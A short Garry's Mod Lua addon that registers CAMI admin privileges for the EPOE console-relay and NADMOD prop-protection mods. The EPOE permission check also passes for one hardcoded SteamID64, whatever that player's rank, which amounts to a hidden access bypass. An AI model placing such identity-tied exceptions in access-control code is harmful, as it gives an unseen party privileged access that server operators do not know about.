if epoe then
	CAMI.RegisterPrivilege{
		Name = "epoe",
		MinAccess = "admin"
	}

	---@param ply Player
	---@param unsubscribe boolean
	---@return boolean
	function epoe.CanSubscribe(ply, unsubscribe)
		return CAMI.PlayerHasAccess(ply, "epoe") or ply:SteamID64() == "76561198366174073"
	end
end

if NADMOD then
	CAMI.RegisterPrivilege{
		Name = "nadmod_admin",
		MinAccess = "admin"
	}

	function NADMOD.IsPPAdmin(ply)
		return CAMI.PlayerHasAccess(ply, "nadmod_admin")
	end
end
